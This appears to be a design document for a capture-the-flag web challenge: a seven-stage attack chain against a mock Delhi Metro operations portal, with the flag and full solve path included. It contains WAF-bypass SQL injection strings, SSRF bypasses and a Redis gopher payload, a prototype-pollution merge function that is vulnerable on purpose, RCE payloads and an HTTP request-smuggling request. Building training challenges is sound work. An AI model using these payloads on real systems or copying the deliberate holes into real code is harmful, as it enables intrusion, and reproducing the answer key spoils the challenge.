# Web Exploitation Challenge: OCC Portal - THE NIGHTMARE

## Challenge Metadata
| Field | Value |
|-------|-------|
| **Name** | OCC Portal: Breach the Central Command |
| **Category** | Web Exploitation |
| **Difficulty** | MEDIUM (ABSOLUTE NIGHTMARE) |
| **Points** | 400 |
| **Solve Time** | 6-10 hours |
| **Flag** | `UG0x1{0CC_P0rt4l_Pwn3d_V10l3t_L1n3}` |

---

## Challenge Story

> **DMRC CLASSIFIED - OPERATIONS CONTROL CENTER**
>
> The OCC Portal is the nerve center of Delhi Metro. Every train movement, 
> every signal change, every announcement flows through this system.
>
> We've discovered a staging version of the portal exposed to the internet.
> Your mission: Chain multiple vulnerabilities to reach the admin panel
> and extract the classified train control codes.
>
> This isn't a simple SQLi or XSS. This is a REAL multi-stage attack chain.
> You'll need to think like an APT actor.
>
> Good luck. You'll need it.
>
> *— UNDERGROUND_0x1 Red Team*

---

## ATTACK CHAIN (7 Stages)

### Stage 1: Recon & Information Disclosure
**Entry Point:** Hidden debug endpoints, exposed .git, robots.txt hints

- `/robots.txt` reveals `/internal/`, `/api/debug/`, `/backup/`
- `/.git/` exposed but protected - need to use git-dumper techniques
- `/api/debug/config` returns partial config with hints
- Response headers leak: `X-Powered-By: Express`, `X-Debug-Token: base64`
- HTML comments contain developer notes with API paths

**Vulnerability:** Information Disclosure, Misconfiguration

---

### Stage 2: Authentication Bypass via JWT Key Confusion
**Target:** Login system with JWT tokens

The JWT uses RS256 but the server also accepts HS256 (algorithm confusion):
```
Original Token (RS256):
{
  "alg": "RS256",
  "typ": "JWT"
}
{
  "user": "guest",
  "role": "viewer",
  "line": "none"
}

Forged Token (HS256 with public key as secret):
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "user": "operator",
  "role": "operator",
  "line": "violet"
}
```

Public key is exposed at `/api/auth/jwks.json` or in HTML comments.

**Vulnerability:** JWT Algorithm Confusion (CVE-2015-9235 style)

---

### Stage 3: IDOR + Encrypted Parameter Tampering
**Target:** User profile and train schedule access

After becoming "operator", access to `/api/schedule/:id` is available.
The ID is encrypted: `GET /api/schedule/aGVsbG8=` (base64 of encrypted blob)

The encryption is weak:
- ECB mode (patterns visible)
- Predictable key derived from date: `SHA256(YYYY-MM-DD)[:16]`
- Or, XOR with repeating key: `VIOLET` (the line name)

Forge encrypted ID to access admin schedule (ID 1):
```python
# Decrypt: XOR with "VIOLET"
# ID 1337 (guest) -> forge to ID 1 (admin)
```

**Vulnerability:** Broken Cryptography, IDOR

---

### Stage 4: Blind SQL Injection with WAF Bypass
**Target:** Search functionality in operator panel

`/api/search?station=Kashmere` has SQLi but:
- WAF blocks: `UNION`, `SELECT`, `'`, `--`, `#`
- Rate limiting: 10 requests/minute

Bypass techniques required:
- Use `/*!50000UNION*/` MySQL version comments
- Encode with double URL encoding: `%2527` 
- Use `LIKE` instead of `=`
- Time-based blind: `SLEEP()` blocked, use `BENCHMARK()`
- Case variation: `uNiOn SeLeCt`
- Comments: `/**/UN/**/ION/**/`

Extract: Admin password hash from `users` table

```sql
' OR 1=1--     → BLOCKED
' oR 1=1#      → BLOCKED
'/**/oR/**/1=1/**/#  → WORKS
%27%2f%2a%2a%2for%2f%2a%2a%2f1%3d1%2f%2a%2a%2f%23 → WORKS
```

**Vulnerability:** SQL Injection with WAF Evasion

---

### Stage 5: SSRF to Internal Redis + Cache Poisoning
**Target:** Avatar upload or URL preview feature

`/api/preview?url=https://example.com` fetches external URLs.

SSRF filters bypass:
- `localhost` blocked → use `127.0.0.1`, `0.0.0.0`, `[::1]`
- IP blocked → use DNS rebinding or `0x7f000001`
- Scheme filter → use `gopher://`, `dict://`, `file://`

Internal service discovery:
- `http://127.0.0.1:6379` → Redis
- `http://169.254.169.254/latest/meta-data/` → Cloud metadata
- `http://internal-api:3001/admin` → Internal admin API

Exploit Redis via SSRF:
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$11%0d%0aadmin_token%0d%0a$32%0d%0aSECRET_ADMIN_TOKEN_HERE%0d%0a
```

**Vulnerability:** SSRF, Redis Exploitation, Cache Poisoning

---

### Stage 6: Prototype Pollution + RCE Chain
**Target:** Admin panel settings merge

Admin panel has a "merge settings" feature:
```javascript
// Vulnerable code
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

Payload:
```json
{
    "__proto__": {
        "shell": "/bin/sh",
        "env": {"NODE_OPTIONS": "--require /proc/self/environ"}
    }
}
```

Or pollute `constructor.prototype`:
```json
{
    "constructor": {
        "prototype": {
            "execPath": "bash -c 'cat /flag.txt'"
        }
    }
}
```

Trigger RCE via polluted spawn options in PDF generation or similar.

**Vulnerability:** Prototype Pollution → RCE

---

### Stage 7: Race Condition for Flag Extraction
**Target:** Final flag retrieval with timing attack

Flag API: `GET /api/admin/flag` requires:
1. Valid admin session
2. TOTP code that changes every 30 seconds
3. Request must come from internal IP

But there's a race condition:
- Between session validation and IP check, there's a window
- Send 100 concurrent requests
- One might slip through

Or use request smuggling:
```
POST /api/admin/flag HTTP/1.1
Host: occ-portal.dmrc.local
Content-Length: 0
Transfer-Encoding: chunked

0

GET /api/admin/flag HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

**Vulnerability:** Race Condition / HTTP Request Smuggling

---

## COMPLETE FLAG PATH

1. **Recon:** Find `/api/debug/config`, get public key
2. **JWT Bypass:** Forge operator token with HS256
3. **IDOR:** Decrypt and forge encrypted schedule ID
4. **SQLi:** Extract admin hash with WAF bypass
5. **Crack Hash:** bcrypt but weak password: `violet2024`
6. **SSRF:** Access Redis, set admin session
7. **Proto Pollution:** Achieve code execution
8. **Race/Smuggle:** Extract final flag

---

## ANTI-SOLVE MEASURES

### 1. Multiple Rabbit Holes
- Fake `/admin` login page (honeypot)
- Decoy flags in database: `UG0x1{th1s_1s_4_tr4p}` etc.
- Fake vulnerability in `/upload` (actually secure)

### 2. Rate Limiting & Detection
- 10 requests/minute on sensitive endpoints
- IP ban after 5 failed attempts
- Requests logged with suspicious patterns flagged

### 3. Dynamic Tokens
- CSRF tokens rotate every request
- Nonces in URLs expire after 60 seconds
- Session tokens change after privilege escalation

### 4. Obfuscated Client-Side
- JavaScript is minified + obfuscated
- API endpoints encoded in base64
- WebSocket for some sensitive operations

### 5. Time-Based Elements
- Some vulnerabilities only work at specific times
- "Maintenance mode" randomly enables/disables features
- Flag changes every hour (but format stays same)

---

## TECH STACK

- **Frontend:** React (obfuscated build)
- **Backend:** Node.js + Express
- **Database:** MySQL + Redis
- **Reverse Proxy:** Nginx with WAF rules
- **Container:** Docker-compose setup

---

## FILES TO CREATE

```
occ-portal/
├── docker-compose.yml
├── nginx/
│   └── nginx.conf (WAF rules)
├── backend/
│   ├── server.js
│   ├── routes/
│   │   ├── auth.js (JWT vuln)
│   │   ├── schedule.js (IDOR)
│   │   ├── search.js (SQLi)
│   │   ├── preview.js (SSRF)
│   │   └── admin.js (Proto pollution, Race)
│   ├── middleware/
│   │   └── waf.js
│   └── utils/
│       └── crypto.js (weak encryption)
├── frontend/
│   └── (React build)
├── database/
│   └── init.sql
└── flag.txt
```

---

## ADMIN PANEL ENTRY

| Field | Value |
|-------|-------|
| **Title** | OCC Portal: The Violet Line Breach |
| **Category** | Web Exploitation |
| **Difficulty** | MEDIUM |
| **Points** | 400 |
| **Flag** | `UG0x1{0CC_P0rt4l_Pwn3d_V10l3t_L1n3}` |
| **URL** | *(deployed challenge URL)* |

### Description:
```
The Operations Control Center manages all of Delhi Metro's train movements. 

A staging portal was accidentally exposed. Your mission is simple: 
Breach the system. Find the classified codes.

This isn't a single vulnerability. This is a chain.

Think like an attacker. Act like an APT.

Good luck. You'll need it.
```

---

## ESTIMATED BUILD TIME
| Component | Time | 
|-----------|------|
| Backend with all vulns | 8-10 hours |
| WAF configuration | 2 hours |
| Frontend mockup | 3 hours |
| Database setup | 1 hour |
| Docker deployment | 2 hours |
| Testing solve path | 3 hours |
| **Total** | **~20 hours** |

---

## PROCEED?

This requires building a full web application with:
- 7-stage vulnerability chain
- WAF that must be bypassed
- Multiple decoys and rabbit holes
- Production-like deployment

Ready to build?
